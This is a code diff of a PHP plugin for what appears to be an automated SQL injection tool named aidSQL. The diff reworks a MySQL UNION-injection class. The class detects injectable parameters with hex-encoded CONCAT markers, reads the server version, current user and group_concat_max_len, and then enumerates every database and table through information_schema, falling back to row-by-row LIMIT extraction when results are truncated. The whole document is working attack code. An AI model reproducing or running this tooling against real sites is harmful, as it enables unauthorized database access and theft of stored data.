@@ -4,9 +4,9 @@
 
 		class MySQL5 extends InjectionPlugin {
 
-			const		PLUGIN_NAME						= "MySQL Standard Plugin by Juan Stange";
+			const		PLUGIN_NAME						= "UNION";
+			const		PLUGIN_AUTHOR					= "Juan Stange";
 
-			private	$_groupConcatLength			=	1024;			//Default group concat character length
 			private	$_affectedDatabases			=	array("mysql");
 			private	$_strRepeat						=	100;
 			private	$_repeatCharacter				=	"a";
@@ -14,14 +14,15 @@
 			private	$_vulnerableIndex				=	0;
 			private	$_fieldWrapping				=	NULL;
 			private	$_injection						=	NULL;
+			private	$_groupConcatLength			=	NULL;
 
 
 			public function injectionUnionWithConcat(){
 
 				$parser	=	new \aidSQL\parser\Generic();
 
-				$openTag				=	"{!-";
-				$closeTag			=	"-!}";
+				$openTag				=	"{!";
+				$closeTag			=	"!}";
 
 				$hexOpen				=	\String::hexEncode($openTag);
 				$hexClose			=	\String::hexEncode($closeTag);
@@ -29,6 +30,7 @@
 				$parser->setOpenTag($openTag);
 				$parser->setCloseTag($closeTag);
 				$parser->setLog($this->_logger);
+
 				$this->setParser($parser);
 
 				$offset	=	(isset($this->_config["start-offset"])) ? (int)$this->_config["start-offset"] : 1;
@@ -55,17 +57,13 @@
 							array("1","1"),
 						)
 					)
-
 				);
 
 				$this->detectUnionInjection($sqliParams,"unionQuery","CONCAT($hexOpen,%value%,$hexClose)");
 
 				if(sizeof($this->_injection)){
 
-					$this->log("FOUND UNION INJECTION WITH CONCAT",0,"light_green");
-					var_dump($this->getGroupConcatLength());
-					die();
-					return $this->getSchema();
+					return TRUE;
 
 				}
 
@@ -134,46 +132,46 @@
 
 									foreach($sqliParams["ending-payloads"]["limit"] as $limit){
 
-										$queryBuilder	=	new \aidSQL\core\QueryBuilder();
-
 										if(!empty($wrapping)){
-											$values	=	$queryBuilder->wrapArray($iterationContainer,$wrapping);
+											$values	=	$this->_queryBuilder->wrapArray($iterationContainer,$wrapping);
 										}else{
 											$values	=	$iterationContainer;
 										}
 
-										$queryBuilder->setCommentOpen($comment);
-										$queryBuilder->union($values,"ALL");
+										$this->_queryBuilder->setCommentOpen($comment);
+										$this->_queryBuilder->union($values,"ALL");
 
 										if(sizeof($order)){
 
-											$queryBuilder->orderBy($order["by"],$order["sort"]);
+											$this->_queryBuilder->orderBy($order["by"],$order["sort"]);
 
 										}
 
 										if(sizeof($limit)){
 
-											$queryBuilder->limit($limit);
+											$this->_queryBuilder->limit($limit);
 
 										}
 
-										$space			=	$queryBuilder->getSpaceCharacter();	
+										$space			=	$this->_queryBuilder->getSpaceCharacter();
+
 										$madeUpValue	=	$this->makeImpossibleValue($requestVariableValue);
+
 										$sql				=	$madeUpValue.$payLoad.
-																$space.$queryBuilder->getSQL().$comment;
+																$space.$this->_queryBuilder->getSQL().$comment;
 
-										$queryBuilder->setSQL($sql);
+										$this->_queryBuilder->setSQL($sql);
 
-										if($isVulnerable	=	$this->query($queryBuilder,$requestVariable,$callback)){
+										$result			=	$this->query($requestVariable,$callback);
+
+										if($result){
 
 											$this->_injection	=	array(
 																				"index"				=>	$maxFields,	
 																				"fieldValues"		=>	$iterationContainer,
 																				"requestVariable"	=>	$requestVariable,
-																				"requestValue"		=>	$value,
+																				"requestValue"		=>	$madeUpValue,
 																				"wrapping"			=>	$wrapping,
-																				"data"				=>	$isVulnerable,
-																				"value"				=>	$madeUpValue,
 																				"payload"			=>	$payLoad,		//constant
 																				"limit"				=>	$limit,			//variable 
 																				"order"				=>	$order,			//variable
@@ -206,54 +204,55 @@
 
 			}
 
-			private function unionQuery($value){
-
-				$this->_verbose=1;
+			private function unionQuery($value,$from=NULL,Array $where=array(),Array $group=array()){
 
 				$params			=	&$this->_injection;
-
-				$queryBuilder	=	new \aidSQL\core\QueryBuilder();
 
 				foreach($params["fieldValues"] as &$val){
 					$val	=	$value;	
 				}
 
-				$params["fieldValues"]	=	$queryBuilder->wrapArray($params["fieldValues"],$params["wrapping"]);
+				$params["fieldValues"]	=	$this->_queryBuilder->wrapArray($params["fieldValues"],$params["wrapping"]);
 
-				$queryBuilder->union($params["fieldValues"],"ALL");
+				$this->_queryBuilder->union($params["fieldValues"],"ALL");
+
+				if(!is_null($from)){
+					$this->_queryBuilder->from($from);
+				}
+
+				if(sizeof($where)){
+					$this->_queryBuilder->where($where);
+				}
+
+				if(sizeof($group)){
+					$this->_queryBuilder->group($group);
+				}
 
 				if(isset($params["order"]["by"])){
-					$queryBuilder->orderBy($params["order"]["by"],$params["order"]["sort"]);
+					$this->_queryBuilder->orderBy($params["order"]["by"],$params["order"]["sort"]);
 				}
 
-				if(isset($params["limit"])){
-					$queryBuilder->limit($params["limit"]);
+				if(is_array($params["limit"])&&sizeof($params["limit"])){
+					$this->_queryBuilder->limit($params["limit"]);
 				}
 
-				$sql	=	$queryBuilder->getSQL();
+				$sql		=	$this->_queryBuilder->getSQL();
+				$sql		=	$params["requestValue"].$params["payload"].$this->_queryBuilder->getSpaceCharacter().$sql.$params["comment"];
 
-				$sql	=	$params["requestValue"].$params["payload"]." ".$sql.$params["comment"];
-				$queryBuilder->setSQL($sql);
-				var_dump($queryBuilder);
-				die();
+				$this->_queryBuilder->setSQL($sql);
+
+				return parent::query($params["requestVariable"],__FUNCTION__);
+
 			}
-
-			public function getPluginName(){
-				return self::PLUGIN_NAME;
-			}
-
 
 			public function getAffectedDatabases(){
 				return $this->_affectedDatabases;
 			}
 
-			//GROUP_CONCAT is very efficient when you want to have a small footprint, however
-			//some databases can be pretty massive, and the default length of characters brough by GROUP_CONCAT is 1024
-			//This simple function will determine this according to the self::_groupConcatLength parameter (default 1024)
 
-			private function detectTruncatedData($string=NULL){
+			private function detectTruncatedData($string=NULL,$length){
 
-				if(strlen($string) == $this->_groupConcatLength){
+				if(strlen($string) == $length){
 
 					$this->log("Warning! Detected possibly truncated data!",2,"yellow");
 					return TRUE;
@@ -264,72 +263,102 @@
 			
 			}
 
+			//GROUP_CONCAT is very efficient when you want to have a small footprint, however
+			//some databases can be pretty massive, and the default length of characters brough by GROUP_CONCAT is 1024
+			//in MySQL, in this way we make sure that the retrieved data has not been truncated. 
+			//If it is we can take other action in order to get what we need.
+
 			private function getGroupConcatLength(){
+
+				if(!is_null($this->_groupConcatLength)){
+					return $this->_groupConcatLength;
+				}
 
 				$this->log("Checking for @@group_concat_max_len",0,"light_cyan");
 
 				$callback	=	$this->_injection["callback"];
-				return $this->$callback("@@group_concat_max_len");
+				$length		=	$this->$callback("@@group_concat_max_len");
+
+				$this->_groupConcatLength = $length[0];
+
+				return $this->_groupConcatLength;
 
 			}
 
-/*
-			private function query($queryBuilder lala){
+			//Suppose you have detected truncated data, well, bad luck.
+			//Hopefully we can count the registers and do a limit iteration	
+			//through that :)
 
-				parent::query($queryBuilder);
+			private function unionQueryIterateLimit($value,$from=NULL,Array $where=array(),Array $group=array()){
 
-			}
-*/
+				$count	=	$this->unionQuery("COUNT($value)",$from,$where,$group);
+				$count	=	$count[0];
 
-			public function getSchema($complete=TRUE){
+				$restoreLimit	=	$this->_injection["limit"];
+				$results			=	array();
 
-				$this->getGroupConcatLength();
-				$version	=	$this->getVersion();
+				for($i=0;$i<$count;$i++){
 
-				if(!$this->checkVersion($version)){
-					throw(new \Exception("Database version mismatch: $version, cant get database schema!"));
+					$this->_injection["limit"]	=	array($i,1);
+					$result		=	$this->unionQuery($value,$from,$where,$group);	
+					$results[]	=	$result[0];
+
 				}
 
+				$this->_injection["limit"]	=	$restoreLimit;
 
-				//Determines server global variable @@group_concat_max_len
-				$this->getGroupConcatLength();
-				die();
+				return $results;
 
-				$select									=	"GROUP_CONCAT(TABLE_NAME)";
-				$from										=	"FROM information_schema.tables WHERE table_schema=DATABASE()";
+			}
 
-				$tables									=	$this->execute($select,$from);
-				$dbSchema								=	new \aidSQL\core\DatabaseSchema();
-				$restoreTerminatingPayload			=	$this->_currTerminatingPayload;
 
-				if($this->detectTruncatedData($tables)){	//We have to do 1 by 1 table retrieval :/ bigger foot print
+			public function getSchemas($complete=TRUE){
 
-					$this->log("Performing table extraction one by one",2,"yellow");
+				$groupConcatLength	=	$this->getGroupConcatLength();
+				$version					=	$this->getVersion();
+				$version					=	$version[0];
+				$databases				=	$this->unionQuery("GROUP_CONCAT(DISTINCT(TABLE_SCHEMA))","information_schema.tables",array());
+				$databases				=	$databases[0];
+				$user						=	$this->getUser();
+				$user						=	$user[0];
 
-					$limit									=	0;
-					$select									=	"TABLE_NAME";
-					$from										=	"FROM information_schema.tables WHERE table_schema=DATABASE()";
+				if($this->detectTruncatedData($databases,$groupConcatLength)){
 
-					$this->_currTerminatingPayload	=	"ORDER BY 1 DESC LIMIT ".$limit++.",1";
+					$databases	=	$this->unionQueryIterateLimit("DISTINCT(TABLE_SCHEMA)","information_schema.tables");
 
-					while($table	=	$this->execute($select,$from)){
+				}else{
 
-						$this->log("Discovered table $table!",0,"light_purple");
-						
-						$restoreTPayLoad	=	$this->_currTerminatingPayload	=	"ORDER BY 1 DESC LIMIT ".$limit++.",1";
+					$databases	=	explode(',',$databases);
 
-						//Add just the table to the table to the DatabaseSchema Object
-						//Columns are retrieved from the runner, this is just because some people
-						//will just like to retrieve all tables and leverage the footprint by not 
-						//fetching table structure
+				}
 
-						$dbSchema->addTable($table,array());
+				foreach($databases as $database){
 
+					if ($database	==	"information_schema"){
+						$this->log("Skipping fetching information_schema databse",0,"yellow");
+						continue;
 					}
 
-				}else{	//no data trunking, everything cool
+					$dbSchema	=	new \aidSQL\core\DatabaseSchema();
 
-					$tables	=	explode(',',$tables);
+					$dbSchema->setDbName($database);
+					$dbSchema->setDbVersion($version);
+					$dbSchema->setDbUser($user);
+
+					$this->log("FOUND DATABASE $database",0,"light_purple");
+
+					$tables	=	$this->unionQuery("GROUP_CONCAT(TABLE_NAME)","information_schema.tables",array("table_schema=".\String::hexEncode($database)));
+					$tables	=	$tables[0];
+				
+					if($this->detectTruncatedData($tables,$groupConcatLength)){
+
+						$tables	=	$this->unionQueryIterateLimit("TABLE_NAME","information_schema.tables",array("table_schema=".\String::hexEncode($database)));
+
+					}else{
+
+						$tables	=	explode(',',$tables);
+
+					}
 
 					foreach($tables as $table){
 
@@ -337,14 +366,11 @@
 
 					}
 
+					$this->addSchema($dbSchema);	
+
 				}
 
-				$this->_currTerminatingPayload	=	$restoreTerminatingPayload;
-
-				return $dbSchema;
-
 			}
-
 
 			public function getColumns($table=NULL){
 
@@ -401,39 +427,17 @@
 
 			}
 
-			public function getDatabase(){
-
-				$select	= "DATABASE()";
-				return $this->execute($select);
-
-			}
-
-			private function cleanUpRepeatInjectionResult($result){
-
-				$length	=	strlen($this->_repeatCharacter);
-				$result	=	substr($result,$this->_strRepeat*$length);
-				$result	=	substr($result,0,($this->_strRepeat*$length)*-1);
-
-				return $result;
-
-			}
-
 			public function getUser(){
 
-				$select	=	"USER()";
-				$user		=	$this->execute($select);
-				return $user;
+				$callback	=	$this->_injection["callback"];
+				return $this->$callback("USER()");
 
 			}
 
 			public function getVersion(){
 
-				if(!is_null($this->_version)){
-					return $this->_version;
-				}
-
-				$select	= "@@version";
-				return $this->_version	=	$this->execute($select);
+				$callback	=	$this->_injection["callback"];
+				return $this->$callback("@@version");
 					
 			}
 
